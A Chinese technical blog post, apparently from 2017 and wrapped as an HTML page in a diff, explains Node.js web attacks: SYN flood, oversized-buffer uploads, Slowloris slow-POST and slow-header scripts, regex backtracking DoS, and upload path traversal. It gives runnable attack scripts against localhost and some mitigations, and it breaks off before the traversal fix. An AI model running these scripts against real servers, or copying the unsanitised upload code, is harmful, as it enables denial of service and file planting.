@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html>
+    <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="referrer" content="never">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="author" content="lizhooh">
+    <meta name="google" content="notranslate">
+    <meta name="url" content="http://me.lizhooh.com">
+    <link rel="manifest" href="/manifest.json">
+    
+    
+    
+    <link rel="canonical" href="http://me.lizhooh.com/stories/2017/05/网络安全/Nodejs Web 攻击/">
+    
+    
+    <title>Nodejs Web 攻击 | Lizhooh 的技术博客 | 来至未来的大全栈工程师自我修养日记。深耕于：数据中台、智能运营、智能推荐、用户数据分析、用户数据治理等大数据领域。</title>
+    
+    <meta name="keywords" content="Lizhooh 的博客，我的博客，我来作主 &lt;br /&gt; 专注于研究：大前端开发领域，Nodejs 后端开发，混合式移动应用开发，Javascript 全栈式开发，数据挖掘与可视化 等技术。">
+    <meta name="description" content="前言最近看书发现了几个比较有趣的 Web 攻击技术，这里记录一下。相关的是应用层 Dos 拒绝服务攻击。 应用层和网络层的 Dos最经典的网络层 Dos 就是 SYN flood，它利用了 tcp 协议的设计缺陷，由于 tcp 协议的广泛使用，所以目前想要根治这个漏洞是不可能的。 攻击者首先使用大量肉鸡服务器并伪造源 IP 地址，向服务器发送 SYN 包，希望建立 tcp 连接，服务器就会正常响应">
+<meta name="keywords" content="后端,Nodejs,网络安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nodejs Web 攻击">
+<meta property="og:url" content="http://me.lizhooh.com/stories/2017/05/网络安全/Nodejs Web 攻击/index.html">
+<meta property="og:site_name" content="Lizhooh 的技术博客">
+<meta property="og:description" content="前言最近看书发现了几个比较有趣的 Web 攻击技术，这里记录一下。相关的是应用层 Dos 拒绝服务攻击。 应用层和网络层的 Dos最经典的网络层 Dos 就是 SYN flood，它利用了 tcp 协议的设计缺陷，由于 tcp 协议的广泛使用，所以目前想要根治这个漏洞是不可能的。 攻击者首先使用大量肉鸡服务器并伪造源 IP 地址，向服务器发送 SYN 包，希望建立 tcp 连接，服务器就会正常响应">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://me.lizhooh.com/assets/image/2017/5/20170521095319.jpg">
+<meta property="og:updated_time" content="2021-06-15T06:10:52.922Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Nodejs Web 攻击">
+<meta name="twitter:description" content="前言最近看书发现了几个比较有趣的 Web 攻击技术，这里记录一下。相关的是应用层 Dos 拒绝服务攻击。 应用层和网络层的 Dos最经典的网络层 Dos 就是 SYN flood，它利用了 tcp 协议的设计缺陷，由于 tcp 协议的广泛使用，所以目前想要根治这个漏洞是不可能的。 攻击者首先使用大量肉鸡服务器并伪造源 IP 地址，向服务器发送 SYN 包，希望建立 tcp 连接，服务器就会正常响应">
+<meta name="twitter:image" content="http://me.lizhooh.com/assets/image/2017/5/20170521095319.jpg">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=2.2.0">
+    <link href="//lib.baomitu.com/tippy.js/3.0.2/themes/light.css" rel="stylesheet">
+
+    <!--<script src="/js/vconsole.min.js"></script> -->
+    <script>
+        window.lazyScripts=[];
+    </script>
+
+    <script>
+    function IEVersion(){var e=navigator.userAgent;var b=e.indexOf("compatible")>-1&&e.indexOf("MSIE")>-1;var d=e.indexOf("Edge")>-1&&!b;var f=e.indexOf("Trident")>-1&&e.indexOf("rv:11.0")>-1;if(b){var a=new RegExp("MSIE (\\d+\\.\\d+);");a.test(e);var c=parseFloat(RegExp["$1"]);return c>=7&&c<=10?c:6}else{return -1}}if(IEVersion()!==-1){var text="检测到你使用的是 IE "+IEVersion()+" 内核浏览器，本博客使用了最新的前端技术，为了获得最佳的体验，请使用 Chrome、Opera、Firefox 等现代浏览器打开。";alert(text)};
+    </script>
+</head>
+
+
+<body>
+    <script>
+        + function () {
+            var S = window.localStorage;
+
+            var theme = S.getItem('theme');
+            var body = document.querySelector('body');
+            if (body === null) {
+                console.log('找不到 body 节点');
+                return;
+            }
+            if (theme === 'night') {
+                body.classList.add('night-mode');
+            }
+
+            function setTheme() {
+                var theme = S.getItem('theme');
+                var body = document.querySelector('body');
+                if (body === null) {
+                    console.log('找不到 body 节点');
+                    return;
+                }
+                if (theme !== 'night') {
+                    body.classList.add('night-mode');
+                    S.setItem('theme', 'night');
+                }
+                else {
+                    body.classList.remove('night-mode');
+                    S.setItem('theme', 'not-night');
+                }
+            }
+
+            function load() {
+                var path = window.location.pathname;
+                var theme = document.querySelector('#theme-toggle');
+                theme.onclick = setTheme;
+
+                if (document.body.clientWidth < 960) {
+                    return;
+                }
+
+                // if (!/\/\d{2,4}/.test(window.location.pathname)) {
+                //     return;
+                // }
+
+                if (!(path === '/' || /\/page\//.test(path))) {
+                    return;
+                }
+            }
+            window.onload = load;
+        } ();
+    </script>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/my.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" style="font-weight: bold">Lizhooh</h5>
+          <span>
+            <a href="mailto:lizhoohs@foxmail.com" title="lizhoohs@foxmail.com" class="mail">lizhoohs@foxmail.com</a>
+          </span>
+
+          <div style="margin-top: 5px; font-size: 92%"><b>337 篇文章，共 387.4k 字</b></div>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <span class="icon-view">
+                    <i class="icon icon-lg icon-home"></i>
+                </span>
+                <span class="text-view">
+                    主页
+                </span>
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags/ES6-ES2015/"  >
+                <span class="icon-view">
+                    <i class="icon icon-lg icon-tags"></i>
+                </span>
+                <span class="text-view">
+                    标签
+                </span>
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories/ES6"  >
+                <span class="icon-view">
+                    <i class="icon icon-lg icon-th-list"></i>
+                </span>
+                <span class="text-view">
+                    分类
+                </span>
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/menu/about.html"  >
+                <span class="icon-view">
+                    <i class="icon icon-lg icon-user"></i>
+                </span>
+                <span class="text-view">
+                    关于
+                </span>
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/menu/book.html"  >
+                <span class="icon-view">
+                    <i class="icon icon-lg icon-book"></i>
+                </span>
+                <span class="text-view">
+                    创作
+                </span>
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/menu/npm.html"  >
+                <span class="icon-view">
+                    <i class="icon icon-lg icon-google"></i>
+                </span>
+                <span class="text-view">
+                    Npm
+                </span>
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Lizhooh" target="_blank" >
+                <span class="icon-view">
+                    <i class="icon icon-lg icon-github"></i>
+                </span>
+                <span class="text-view">
+                    Github
+                </span>
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <!-- 正文 -->
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Nodejs Web 攻击</div>
+
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search" title="搜索">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="theme-toggle" title="夜间模式">
+          <i class="icon icon-lg icon-moon-o" style="font-weight: bold"></i>
+        </a>
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on">
+            <i class="icon icon-lg icon-share-alt" style="font-weight: bold"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header" style="">
+
+    <!--<div class="container fade-scale">-->
+    <div class="container" id="container-header">
+        <h1 class="title">Nodejs Web 攻击</h1>
+
+        <div class="meta-rest">
+            <h1>Nodejs Web 攻击</h1>
+            <section>
+                <img src="/img/my.png" class="avatar" />
+                <div sty>
+                    <span class="name">Lizhooh</span>
+                    <span class="summary">前端开发者</span>
+                    <span class="summary">温故而知新，可以为师矣。</span>
+                </div>
+            </section>
+        </div>
+
+        <h3 class="subtitle">
+            
+                <time datetime="2017-05-21T00:29:32.000Z" itemprop="datePublished" class="page-time">
+    2017-05-21
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/网络安全/">网络安全</a></li></ul>
+
+
+            
+        </h3>
+    </div>
+
+    
+
+</header>
+
+
+<div class="container body-wrap">
+    
+
+
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#应用层和网络层的-Dos"><span class="post-toc-number">2.</span> <span class="post-toc-text">应用层和网络层的 Dos</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#超大-Buffer"><span class="post-toc-number">3.</span> <span class="post-toc-text">超大 Buffer</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Slowlori-攻击"><span class="post-toc-number">4.</span> <span class="post-toc-text">Slowlori 攻击</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#HTTP-Header-攻击"><span class="post-toc-number">5.</span> <span class="post-toc-text">HTTP Header 攻击</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#正则表达式的-DOS-攻击"><span class="post-toc-number">6.</span> <span class="post-toc-text">正则表达式的 DOS 攻击</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文件上传路径漏洞攻击"><span class="post-toc-number">7.</span> <span class="post-toc-text">文件上传路径漏洞攻击</span></a></li></ol>
+        </nav>
+    </aside>
+    
+
+<article id="post-网络安全/Nodejs Web 攻击"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Nodejs Web 攻击</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2017 年 05 月 21 日 8:29" datetime="2017-05-21T00:29:32.000Z"  itemprop="datePublished">
+    2017-05-21
+</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/网络安全/">网络安全</a></li></ul>
+
+
+
+            <span style="color: dodgerblue">
+                字数：<span style="font-size: 14px;"> 1886</span>
+            </span>
+            <span>
+                阅读预计<span style="font-size: 14px; color: orange;">  17.5  </span> 分钟
+            </span>
+        </div>
+
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看书发现了几个比较有趣的 Web 攻击技术，这里记录一下。<br>相关的是应用层 Dos 拒绝服务攻击。</p>
+<h2 id="应用层和网络层的-Dos"><a href="#应用层和网络层的-Dos" class="headerlink" title="应用层和网络层的 Dos"></a>应用层和网络层的 Dos</h2><p>最经典的网络层 Dos 就是 SYN flood，它利用了 tcp 协议的设计缺陷，由于 tcp 协议的广泛使用，所以目前想要根治这个漏洞是不可能的。</p>
+<p>攻击者首先使用大量肉鸡服务器并伪造源 IP 地址，向服务器发送 SYN 包，希望建立 tcp 连接，服务器就会正常响应 SYN/ACK 包，等待客户端响应。攻击客户端并不会响应这些 SYN/ACk 包，服务器端判断客户端超时就会丢掉这个连接。</p>
+<p>如果这些攻击连接数量巨大，最终服务器就会因为等待和频繁处理这种半连接而失去对正常请求的响应，从而导致拒绝服务攻击成功。</p>
+<p>往往黑客在攻陷了几个大流量的网站后，会注入以下代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"..."</span> <span class="attr">style</span>=<span class="string">"width: 0; height: 0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样，这些网站就成了黑客的帮凶，从而更容易的攻陷其他网站。</p>
+
+        <figure class="image-bubble">
+            <div class="img-lightbox">
+                <div class="overlay"></div>
+                <img src="/assets/image/2017/5/20170521095319.jpg" alt title>
+            </div>
+            <div class="image-caption"></div>
+        </figure>
+    
+<a id="more"></a>
+<h2 id="超大-Buffer"><a href="#超大-Buffer" class="headerlink" title="超大 Buffer"></a>超大 Buffer</h2><p>如果服务器没有对文件上传大小作限制，可以使用 <code>超大 Buffer</code> 的攻击手法。<br>假设对方的服务器内存只有 512 M 的小型服务器，这样的话可以向目标服务器发送一个比它内存大的文件，从而让对方的主机内存消耗殆尽。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> Buffer((<span class="number">1</span> &lt;&lt; <span class="number">10</span>) * (<span class="number">1</span> &lt;&lt; <span class="number">10</span>) * <span class="number">700</span>); <span class="comment">// 700 M</span></span><br><span class="line">buf.full(<span class="string">'a'</span>);</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">'http://127.0.0.1:3000'</span>, &#123;</span><br><span class="line">    method: <span class="string">'post'</span>,</span><br><span class="line">    body: buf,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>那么，Nodejs 应该如何解决这类攻击？那就是限制文件上传大小。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> len = <span class="number">0</span>;</span><br><span class="line">req.on(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">    len += chunk.length;</span><br><span class="line">    <span class="keyword">if</span>(len &gt; (<span class="number">1</span> &lt;&lt; <span class="number">10</span>) * (<span class="number">1</span> &lt;&lt; <span class="number">10</span>)) &#123;   <span class="comment">// 1 M</span></span><br><span class="line">        res.end(<span class="string">'error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h2 id="Slowlori-攻击"><a href="#Slowlori-攻击" class="headerlink" title="Slowlori 攻击"></a>Slowlori 攻击</h2><p>POST 慢速 Dos 攻击是在 2010 年 OWASP 大会上被揭秘的，这种攻击针对 <code>配置较低的服务器</code> 具有很强的威力，往往几台攻击客户端可以轻松击垮一台 Web 应用服务器。</p>
+<p>攻击者先向 Web 应用服务器发起一个正常的 POST 请求，设定一个在 Web 服务器限定范围内并且设置比较大的 <code>Content-Length</code>，然后以非常慢的速度发送数据，比如 30 秒左右发一次 10 byte 的数据给服务器，保持这个连接不释放。</p>
+<p>因为客户端一直在向服务器发包，所以服务器也不会认为连接超时，这样，服务器的一个 tcp 连接就一直被一个慢速的 POST 占用，极大地浪费服务器资源。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">    hostname: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    port: <span class="number">3000</span>,</span><br><span class="line">    path: <span class="string">'/ajax'</span>,</span><br><span class="line">    method: <span class="string">'post'</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: (<span class="number">1</span> &lt;&lt; <span class="number">10</span>) * (<span class="number">1</span> &lt;&lt; <span class="number">10</span>),   <span class="comment">/// 超大的 Content-Length</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> max = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">let</span> reqArray = [];</span><br><span class="line">http.globalAgent.maxSockets = max;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (max--) &#123;</span><br><span class="line">    reqArray.push(</span><br><span class="line">        http.request(options, res =&gt; &#123;</span><br><span class="line">            res.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'start'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每 5 秒，发一次数据</span></span><br><span class="line">setInterval(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">    reqArray.forEach(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> buf = <span class="keyword">new</span> Buffer(<span class="number">1</span> &lt;&lt; <span class="number">10</span>);</span><br><span class="line">        buf.fill(<span class="built_in">Math</span>.random().toString(<span class="number">32</span>));</span><br><span class="line">        i.write(buf);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;, <span class="number">1000</span> * <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
+<p>由于 Nodejs 天生的单线程异步性能，这样就可以只写定时器，来多连接的实现慢攻击。而不像其他语言一样需要创建 1000 多个线程来发送请求。<br>有网友测试，发现慢 POST 攻击对 <code>Apache + PHP</code> 的效果十分明显， Apache 的 maxClients 几乎在瞬间被锁住，从而失去响应。</p>
+<h2 id="HTTP-Header-攻击"><a href="#HTTP-Header-攻击" class="headerlink" title="HTTP Header 攻击"></a>HTTP Header 攻击</h2><p>一般来说，Web 服务器会设定 HTTP 请求的接收时长，是指客户端在指定时间内必须把 HTTP 的 head 发送完毕。如果 Web 服务器没有在这方面限制，我们也可以用同样的原理慢速地发送 head 数据包，造成服务器连接浪费。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> net = request(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">let</span> max = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">const</span> host = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="keyword">const</span> headStr = <span class="string">`GET / HTTP/1.1\r\nHost: <span class="subst">$&#123;host&#125;</span>\r\n`</span>;</span><br><span class="line"><span class="keyword">const</span> chientArray = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(max--) &#123;</span><br><span class="line">    <span class="keyword">const</span> chient = net.connect(&#123; <span class="attr">post</span>: <span class="number">3000</span>, <span class="attr">host</span>: host &#125;);</span><br><span class="line"></span><br><span class="line">    chient.on(<span class="string">'error'</span>, err =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;).on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'end'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    chientArray.push(chient);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 慢慢发</span></span><br><span class="line">setInterval(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">    chientArray.forEach(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">        i.write(<span class="string">'xhead: gap\r\n'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;, <span class="number">1000</span> * <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
+<p>这里定义了一个发不完了请求头，定时每 5 秒发一次，类似慢 POST 攻击，不够是利用 Header 头。<br>Nodejs 对用户的 HTTP 请求头做了大小限制，如果 Web 服务器没有做这个限制，那么可以发超大 Buffer 来恶意销毁服务器的内存。</p>
+<h2 id="正则表达式的-DOS-攻击"><a href="#正则表达式的-DOS-攻击" class="headerlink" title="正则表达式的 DOS 攻击"></a>正则表达式的 DOS 攻击</h2><p>正则表达式如果书写不过规范，也有可能会成为被攻击的对象。</p>
+<p>正则表达式引擎 NFA 具有回溯性，回溯性的一个重要负面影响是，虽然正则表达式可以相当快速地计算匹配，但是确定否定匹配所需的时间会稍长。实际上，引擎必须确定输入字符串中没有任何可能的路径与正则表达式匹配才会认为否定匹配。</p>
+<p>这就意味着引擎必须对所有路径进行测试。</p>
+<p>比如说这两个匹配方式，只有小小的差别，但是匹配的时间却是相差很大。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> regx1 = <span class="regexp">/^(\d+)$/</span>;</span><br><span class="line"><span class="keyword">const</span> regx2 = <span class="regexp">/^(\d+)+$/</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> str = <span class="string">'1234567890123456789012345X'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'^(\d+)$'</span>);</span><br><span class="line">regx1.test(str);</span><br><span class="line"><span class="built_in">console</span>.timeEnd(<span class="string">'^(\d+)$'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'^(\d+)+$'</span>);</span><br><span class="line">regx2.test(str);</span><br><span class="line"><span class="built_in">console</span>.timeEnd(<span class="string">'^(\d+)+$'</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">^(d+)$:  <span class="number">0.119</span>ms</span><br><span class="line">^(d+)+$: <span class="number">367.251</span>ms</span><br></pre></td></tr></table></figure>
+<p>假如把字符串 str 再增长一点：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// const str = '1234567890123456789012345X';</span></span><br><span class="line">   <span class="keyword">const</span> str = <span class="string">'12345678901234567890123456789X'</span>;</span><br></pre></td></tr></table></figure>
+<p>这是的结果是，长达 5s 的匹配时间：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">^(d+)$:  <span class="number">0.137</span>ms</span><br><span class="line">^(d+)+$: <span class="number">5434.793</span>ms</span><br></pre></td></tr></table></figure>
+<p>如果我们继续增加检测字符串的长度，那么匹配的时间就会成倍的增长，从而让服务器 CPU 处于频繁的计算中而无法处理其他任务，造成拒绝服务。</p>
+<h2 id="文件上传路径漏洞攻击"><a href="#文件上传路径漏洞攻击" class="headerlink" title="文件上传路径漏洞攻击"></a>文件上传路径漏洞攻击</h2><p>文件上传路径的漏洞也是非常致命的，常常伴随着被恶意用户挂马或者代码泄漏。</p>
+<p>假设，我们现在用 Nodejs 写文件上传功能，可能代码是这样的，使用 <code>busboy</code> 来解析文件数据。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 监听文件解析事件</span></span><br><span class="line">busboy.on(<span class="string">'file'</span>, (fieldname, file, filename, encoding, mimetype) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 文件名</span></span><br><span class="line">    name = <span class="built_in">Date</span>.now() + <span class="string">'_'</span> + filename;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件保存到特定路径</span></span><br><span class="line">    file.pipe(fs.createWriteStream(</span><br><span class="line">        path.join(options.publicDir, options.uploadDir, name)</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始解析文件流</span></span><br><span class="line">    file.on(<span class="string">'data'</span>, (data) =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`File [<span class="subst">$&#123;fieldname&#125;</span>] 已上传: <span class="subst">$&#123;data.length&#125;</span> bytes`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析文件结束</span></span><br><span class="line">    file.on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`File [<span class="subst">$&#123;fieldname&#125;</span>] 上传结束`</span>);</span><br><span class="line">        resolve(&#123;</span><br><span class="line">            success: <span class="literal">true</span>,</span><br><span class="line">            file: <span class="string">`<span class="subst">$&#123;path.join(options.uploadDir, name)&#125;</span>`</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>如果代码是这样的那么，就等着被人挂马吧。</p>
+<p><strong>再来看看下面的输出：</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> dir = <span class="string">'/public/upload/'</span>;</span><br><span class="line"><span class="keyword">const</span> name = <span class="string">'/../../aaa.txt'</span>;</span><br><span class="line"><span class="keyword">const</span> file = <span class="built_in">Date</span>.now() + <span class="string">'-'</span> + name;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(path.join(dir,file)); <span class="comment">// \aaa.txt</span></span><br></pre></td></tr></table></figure>
+<p>本来想把文件上传到 <code>/public/upload/</code> 下，不知不觉被攻击者构造成根目录下，想想都觉得可怕。</p>
+<p><strong>上面的文件上传的漏洞在于这里：</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件名</span></span><br><span class="line">name = <span class="built_in">Date</span>.now() + <span class="string">'_'</span> + filename;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件保存到特定路径</span></span><br><span class="line">file.pipe(fs.createWriteStream(</span><br><span class="line">    path.join(options.publicDir, options.uploadDir, name)</span><br><span class="line">));</span><br></pre></td></tr></table></figure>
+<p>这里完全可以通过特殊构造把文件上传到别的地方。</p>
+<p><strong>那么该如何防范？ 代码改成下面的就可以解决：</strong></p>
